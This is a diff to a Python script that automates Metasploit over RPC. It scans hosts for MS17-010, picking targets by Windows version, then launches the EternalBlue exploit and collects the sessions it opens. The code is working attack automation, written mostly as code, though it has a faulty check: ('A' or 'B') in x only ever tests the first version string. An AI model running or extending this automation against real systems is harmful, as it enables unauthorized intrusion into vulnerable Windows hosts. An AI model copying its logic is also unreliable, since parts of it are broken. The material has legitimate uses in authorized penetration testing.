@@ -10,8 +10,8 @@ def script_automate_scan():
 
     @return: list data from the metasploit console, the rpc client and the console associated to this client
     '''
-    # check opened port
-    opened_vuln_port, ip_vuln = look_for_port()
+    # check failure version
+    ip_version_vuln = look_for_version()
     # print(opened_vuln_port)
 
     # test with putting an unexploitable
@@ -30,32 +30,33 @@ def script_automate_scan():
 
     # pdb.set_trace()
     #######################################CHECK OPENED PORT####################################
-    if '445' in opened_vuln_port:
-        auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
-        exploit_name = 'windows/smb/ms17_010_eternalblue'
+    for tuple_info in ip_version_vuln:
+        ###################################ETERNALBLUE SECTION##################################
+        if ('Microsoft Windows Server 2008 R2' or 'Windows 7') in tuple_info[2]:
+            auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
+            exploit_name = 'windows/smb/ms17_010_eternalblue'
 
-        ######################################GET IP VULN FOR 445###############################
+            ######################################GET IP VULN FOR 445###############################
 
-        vuln_ip_445 = look_for_ip_associated_port(ip_vuln, '445')
-        # print(vuln_ip_445)
+            vuln_ip_smb = tuple_info[0]
+            # print(vuln_ip_445)
 
-        ######################################AUXILIARY SCAN####################################
-        data_read_out = []
-        for ip in vuln_ip_445:
-            data_console = main_enter_console_for_scan(auxiliary_scan, ip, console)
+            ######################################AUXILIARY SCAN####################################
+            data_read_out = []
+            data_console = main_enter_console_for_scan(auxiliary_scan, vuln_ip_smb, console)
             # pdb.set_trace()
             if data_console != -1:
                 if 'Host is likely VULNERABLE to MS17-010!' in data_console['data']:
-                    data_read_out.append('ip : ' + str(ip) + ' ; ' + ' Host is likely VULNERABLE to : ' + exploit_name)
+                    data_read_out.append('ip : ' + vuln_ip_smb + ' ; ' + ' Host is likely VULNERABLE to : ' + exploit_name)
                 elif 'OptionValidateError' in data_console['data']:
-                    data_read_out.append('ip : ' + str(ip) + ' ; ' + ' OptionValidateError : Auxiliary failed : ' + exploit_name)
+                    data_read_out.append(
+                        'ip : ' + vuln_ip_smb + ' ; ' + ' OptionValidateError : Auxiliary failed : ' + exploit_name)
 
-    # if '8020' in opened_vuln_port:
+                # if '8020' in opened_vuln_port:
 
+                return data_read_out, client, console
 
-
-
-    return data_read_out, client, console
+    return -1
 
 
 def script_automate_exploit(data_read_out, client, console):
@@ -83,8 +84,8 @@ def script_automate_exploit(data_read_out, client, console):
     hostname = s.getsockname()[0]
     s.close()
 
-    pdb.set_trace()
-    #extract ip from data_read_outh which is a list of string which mentions possible vulnerable ip
+    # pdb.set_trace()
+    # extract ip from data_read_outh which is a list of string which mentions possible vulnerable ip
     for data in data_read_out:
         for ip in ip_vuln:
             if ip[0] in data and ip[0] not in ip_vuln_reconf:
@@ -114,7 +115,6 @@ def script_automate_exploit(data_read_out, client, console):
                 json_data, session_create = main_exe_exploit(payload, exploit, client)
 
                 # if session_create == -1:
-
 
             print(client.sessions.list)
             sessions_created = client.sessions.list
